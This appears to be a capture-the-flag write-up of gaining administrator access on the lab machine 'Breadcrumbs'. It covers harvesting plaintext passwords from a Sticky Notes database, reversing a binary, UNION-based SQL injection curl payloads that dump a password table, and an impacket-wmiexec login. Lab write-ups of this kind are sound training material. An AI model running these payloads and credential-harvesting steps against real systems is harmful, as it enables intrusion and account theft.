# Getting Root

![[Pasted image 20211221094702.png]]

```poowershell
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
```

### Login on ssh with the creds
* Using "-o PubkeyAuthentication=no" because windows dont handle well SSH
```bash
$ ssh -o PubkeyAuthentication=no juliette@10.10.10.228
The authenticity of host '10.10.10.228 (10.10.10.228)' can't be established.
ECDSA key fingerprint is SHA256:JpPYtFfyEYypgrRNtWR/Ekn1RM4ltgVxa41kmIxpkoY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.228' (ECDSA) to the list of known hosts.
juliette@10.10.10.228's password: 
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

juliette@BREADCRUMBS C:\Users\juliette>
```


### get content of todo.html
* Microsoft store sticky (where is ?)
```powershell
PS C:\Users\juliette\desktop> gc todo.html
<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>

```

### Locate of Sticky Notes
``` powershell
juliette@BREADCRUMBS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

01/15/2021  04:10 PM    <DIR>          .
01/15/2021  04:10 PM    <DIR>          ..
01/15/2021  04:10 PM            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
11/29/2020  03:10 AM             4,096 plum.sqlite
01/15/2021  04:10 PM            32,768 plum.sqlite-shm
01/15/2021  04:10 PM           329,632 plum.sqlite-wal
               4 File(s)        386,976 bytes
               2 Dir(s)   5,469,290,496 bytes fre
```

### Copy all files to our machine
```bash
$ scp -o 'PubkeyAuthentication=no' juliette@10.10.10.228:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/* .
juliette@10.10.10.228's password: 
15cbbc93e90a4d56bf8d9a29305b8981.storage.session                                                                                                            100%   20KB  42.4KB/s   00:00    
plum.sqlite                                                                                                                                                 100% 4096    16.8KB/s   00:00    
plum.sqlite-shm                                                                                                                                             100%   32KB 126.1KB/s   00:00    
plum.sqlite-wal                                                                                                                                             100%  322KB  61.2KB/s   00:0
```

### Dump the plum.sql
```bash
$ sqlite3 plum.sqlite   
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .dump       
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
INSERT INTO Note VALUES(replace('\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!\n\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g\n\id=48924119-7212-4b01-9
e0f-ae6d678d49b2 administrator: [MOVED]','\n',char(10)),'ManagedPosition=',1,0,NULL,'Yellow',0,NULL,NULL,NULL,NULL,NULL,NULL,'0c32c3d8-7c60-48ae-939e-798df198cfe7','8e814e57-9d28-4288-961c-3
1c806338c5b',637423162765765332,NULL,637423163995607122);
CREATE TABLE IF NOT EXISTS "Stroke" (

```

*** New Creds *** :  development: fN3)sN5Ee@g

### SSH as development user

``` bash
$ ssh -o 'PubKeyAuthentication=no' development@10.10.10.228                                                                                                                          
development@10.10.10.228's password:                                                                                                                                                          
Microsoft Windows [Version 10.0.19041.746]                                                                                                                                                    
(c) 2020 Microsoft Corporation. All rights reserved.                                           

development@BREADCRUMBS C:\Users\development>
```

* Download file to see exam
![[Pasted image 20211221101442.png]]

``` bash
$ scp -o 'PubkeyAuthentication=no' development@10.10.10.228:/Development/Krypter_linux .
development@10.10.10.228's password: 
Krypter_linux                                               100%   18KB  38.3KB/s   00:00    
┌─[us-vip-13]─[10.10.14.21]─[dix@motoko]─[~/htb/breadcrumbs/copy/development]
└──╼ [??]$ ls
Krypter_linux
┌─[us-vip-13]─[10.10.14.21]─[dix@motoko]─[~/htb/breadcrumbs/copy/development]
└──╼ [??]$ file Krypter_linux 
Krypter_linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
```

* give priv execution to file and run with gidhra
* Exam function main
![[Pasted image 20211221104431.png]]


![[Pasted image 20211221123415.png]]
* 0x641 to decimal, try to input the valor with decimal
* 0x641 = 1601 decimal 
* 1601 = (15 * d ) + (2) + ( 3)
* (15 * d ) = 1500
* (2)  = 50
* (3) = 51

### input this values on Krypter
```bash
$ ./Krypter_linux ddddddddddddddd23
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
***

Requesting decryption key from cloud...
Account: Administrator
Server response:


selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

```



* Try to port foward to connect to port 1234
```bash
$ ssh -o PubKeyAuthentication=no -L 1234:127.0.0.1:1234  development@10.10.10.228 
```

* Verifying port foward is working
```bash
$ curl passmanager.htb:1234 -d 'method=select&username=administrator&table=passwords'
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

```

* Try SQLi
* Is vulnerable to SQLi
```bash
$ curl passmanager.htb:1234 -d "method=select&username=administrator'-- -&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```


```bash
$ curl passmanager.htb:1234 -d "method=select&username=administrator' union select concat(table_name, ':',column_name) from information_schema.columns where table_schema='bread'-- -&table=passwords"
selectarray(5) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(12) "passwords:id"
  }
  [2]=>
  array(1) {
    ["aes_key"]=>
    string(17) "passwords:account"
  }
  [3]=>
  array(1) {
    ["aes_key"]=>
    string(18) "passwords:password"
  }
  [4]=>
  array(1) {
    ["aes_key"]=>
    string(17) "passwords:aes_key"
  }
}

```

```bash
$ curl passmanager.htb:1234 -d "method=select&username=administrator' union select concat(account,':',aes_key,':',password) from bread.passwords-- -&table=passwords"
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(75) "Administrator:k19D193j.<19391(:H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw="
  }
}

```
*** "Administrator:k19D193j.<19391(:H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=" ***
![[Pasted image 20211221125405.png]]

### Creds
Administrator : p@ssw0rd!@#$9890./

# Connecting as administrator with wmiexec (AV stop psexec)
```bash
$ impacket-wmiexec administrator@10.10.10.228
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
breadcrumbs\administrator

```

![[Pasted image 20211221130021.png]]